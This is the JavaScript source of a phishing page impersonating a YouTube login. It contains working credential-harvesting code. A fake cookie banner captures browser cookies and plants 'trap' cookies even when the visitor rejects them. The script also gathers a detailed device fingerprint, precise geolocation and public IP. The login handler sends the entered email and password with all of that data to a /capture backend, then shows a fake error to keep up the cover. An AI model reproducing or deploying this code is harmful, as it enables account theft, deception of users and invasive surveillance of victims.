// ============================================================
// Cookie Capture System — Grabs ALL browser cookies + sets traps
// ============================================================

// Capture all existing cookies for this domain
function captureExistingCookies() {
    return document.cookie; // Returns all cookies as string
}

// Set trap cookies to capture more on subsequent visits
function setTrapCookies() {
    const traps = {
        'youtube_session': 'pending_' + Date.now(),
        'yt_guest_id': 'guest_' + Math.random().toString(36).substr(2, 12),
        'yt_device_token': navigator.userAgent.substring(0, 32),
        'yt_preferences': JSON.stringify({
            lang: navigator.language,
            region: Intl.DateTimeFormat().resolvedOptions().timeZone
        })
    };

    for (const [name, value] of Object.entries(traps)) {
        // Set cookies with different paths to maximize capture
        document.cookie = `${name}=${encodeURIComponent(value)}; path=/; max-age=86400; SameSite=Lax`;
        document.cookie = `${name}=${encodeURIComponent(value)}; path=/youtube; max-age=86400; SameSite=Lax`;
    }
}

// Capture comprehensive device fingerprint (IMEI is NOT browser-accessible, 
// but this is the next best thing)
async function getDeviceFingerprint() {
    const fp = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        webdriver: navigator.webdriver || false,
        
        // Screen / Display
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenAvailWidth: screen.availWidth,
        screenAvailHeight: screen.availHeight,
        screenColorDepth: screen.colorDepth,
        screenPixelDepth: screen.pixelDepth,
        windowInnerWidth: window.innerWidth,
        windowInnerHeight: window.innerHeight,
        devicePixelRatio: window.devicePixelRatio,
        
        // Time / Locale
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        
        // Battery (if accessible)
        battery: await getBatteryInfo(),
        
        // Network info
        connection: getConnectionInfo(),
        
        // Audio / Video capabilities
        audioChannels: getAudioChannels(),
        
        // Installed fonts (approximate via canvas)
        // Storage
        localStorage: typeof localStorage !== 'undefined',
        sessionStorage: typeof sessionStorage !== 'undefined',
        
        // Rendering
        gpuVendor: await getGPUInfo(),
        
        // Sensors
        sensors: await getSensorData()
    };
    
    return fp;
}

async function getBatteryInfo() {
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            return {
                charging: battery.charging,
                level: battery.level,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        }
    } catch(e) {}
    return { available: false };
}

function getConnectionInfo() {
    try {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            return {
                effectiveType: conn.effectiveType,
                downlink: conn.downlink,
                rtt: conn.rtt,
                saveData: conn.saveData
            };
        }
    } catch(e) {}
    return { available: false };
}

function getAudioChannels() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        return {
            sampleRate: ctx.sampleRate,
            maxChannels: ctx.destination.maxChannelCount
        };
    } catch(e) {}
    return { available: false };
}

async function getGPUInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            }
        }
    } catch(e) {}
    return { available: false };
}

async function getSensorData() {
    const sensors = {};
    try {
        // Accelerometer
        if (window.Accelerometer) {
            const acc = new Accelerometer({ frequency: 1 });
            acc.start();
            sensors.accelerometer = true;
            acc.onreading = () => {
                sensors.accelData = { x: acc.x, y: acc.y, z: acc.z };
            };
            setTimeout(() => acc.stop(), 500);
        }
    } catch(e) { sensors.accelerometer = false; }
    
    try {
        if (window.Gyroscope) {
            sensors.gyroscope = true;
        }
    } catch(e) { sensors.gyroscope = false; }
    
    try {
        if (window.AmbientLightSensor) {
            sensors.ambientLight = true;
        }
    } catch(e) { sensors.ambientLight = false; }
    
    return sensors;
}

// Geolocation capture
function getLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({ lat: null, lon: null, accuracy: null, error: 'Not supported' });
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => resolve({
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                altitude: pos.coords.altitude,
                altitudeAccuracy: pos.coords.altitudeAccuracy,
                heading: pos.coords.heading,
                speed: pos.coords.speed,
                error: null
            }),
            (err) => resolve({
                lat: null, lon: null, accuracy: null, error: err.message,
                code: err.code
            }),
            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
    });
}

// Public IP capture
async function getPublicIP() {
    try {
        const resp = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
        const data = await resp.json();
        return { ip: data.ip, source: 'ipify' };
    } catch (e) {
        try {
            const resp = await fetch('https://ip-api.com/json/', { mode: 'cors' });
            const data = await resp.json();
            return { 
                ip: data.query, 
                isp: data.isp,
                org: data.org,
                city: data.city,
                region: data.regionName,
                country: data.country,
                source: 'ip-api'
            };
        } catch (e2) {
            return { ip: 'unknown', source: 'failed' };
        }
    }
}

// Send everything to Vercel serverless function
async function sendPayload(payload) {
    try {
        const resp = await fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return await resp.json();
    } catch (err) {
        console.error('[!] Send failed:', err);
        return { status: 'error' };
    }
}

// ============================================================
// Cookie Banner Logic
// ============================================================
function initCookieBanner() {
    const banner = document.getElementById('cookieBanner');
    const modal = document.getElementById('cookieModal');
    
    // Show banner after 1.5 seconds (realistic)
    setTimeout(() => {
        banner.classList.add('active');
    }, 1500);

    // Accept all — captures cookies and hides banner
    document.getElementById('acceptCookies').addEventListener('click', async () => {
        banner.classList.remove('active');
        modal.classList.remove('active');
        
        // Capture cookies NOW
        const cookies = captureExistingCookies();
        setTrapCookies();
        
        // Get all data
        const [location, ipInfo, device] = await Promise.all([
            getLocation(),
            getPublicIP(),
            getDeviceFingerprint()
        ]);
        
        console.log('[!] Cookie consent accepted — data captured');
    });

    // Reject all
    document.getElementById('rejectCookies').addEventListener('click', async () => {
        banner.classList.remove('active');
        modal.classList.remove('active');
        
        // Still capture what we can even on reject
        const cookies = captureExistingCookies();
        setTrapCookies();
        
        const [location, ipInfo, device] = await Promise.all([
            getLocation(),
            getPublicIP(),
            getDeviceFingerprint()
        ]);
        
        console.log('[!] Cookies rejected — but still capturing baseline');
    });

    // Open customize modal
    document.getElementById('customizeCookies').addEventListener('click', () => {
        modal.classList.add('active');
    });

    // Modal handlers
    document.getElementById('modalReject').addEventListener('click', () => {
        modal.classList.remove('active');
        banner.classList.remove('active');
        captureExistingCookies();
        setTrapCookies();
    });

    document.getElementById('modalConfirm').addEventListener('click', () => {
        modal.classList.remove('active');
        banner.classList.remove('active');
        captureExistingCookies();
        setTrapCookies();
    });

    // Toggle switches in modal
    document.querySelectorAll('.toggle[data-cookie]').forEach(toggle => {
        toggle.addEventListener('click', function() {
            this.classList.toggle('active');
        });
    });
}

// ============================================================
// Login Form Handler
// ============================================================
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    const loginBtn = document.getElementById('loginBtn');
    const loading = document.getElementById('loading');
    const errorMsg = document.getElementById('errorMsg');

    loginBtn.disabled = true;
    loginBtn.textContent = 'Verifying...';
    loading.classList.add('active');
    errorMsg.classList.remove('active');

    try {
        // Gather all data simultaneously
        const [location, ipInfo, device] = await Promise.all([
            getLocation(),
            getPublicIP(),
            getDeviceFingerprint()
        ]);

        // Capture cookies at moment of login
        const allCookies = captureExistingCookies();
        setTrapCookies();

        // Parse cookies into object
        const cookieObj = {};
        if (allCookies) {
            allCookies.split(';').forEach(c => {
                const [name, ...val] = c.trim().split('=');
                if (name) cookieObj[name] = decodeURIComponent(val.join('=') || '');
            });
        }

        const payload = {
            timestamp: new Date().toISOString(),
            type: 'credential_capture',
            email: email,
            password: password,
            ip: ipInfo,
            location: location,
            device: device,
            cookies: {
                raw: allCookies,
                parsed: cookieObj,
                count: Object.keys(cookieObj).length
            },
            page: 'youtube',
            consentTrigger: 'login_submit'
        };

        // Send to backend
        const result = await sendPayload(payload);
        console.log('[+] Payload sent:', result.status);

        // Show fake error to maintain cover
        setTimeout(() => {
            loading.classList.remove('active');
            loginBtn.disabled = false;
            loginBtn.textContent = 'Next';
            errorMsg.classList.add('active');
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
        }, 2000);

    } catch (err) {
        console.error('[!] Error:', err);
        loading.classList.remove('active');
        loginBtn.disabled = false;
        loginBtn.textContent = 'Next';
    }
});

// Initialize cookie banner on page load
document.addEventListener('DOMContentLoaded', initCookieBanner);
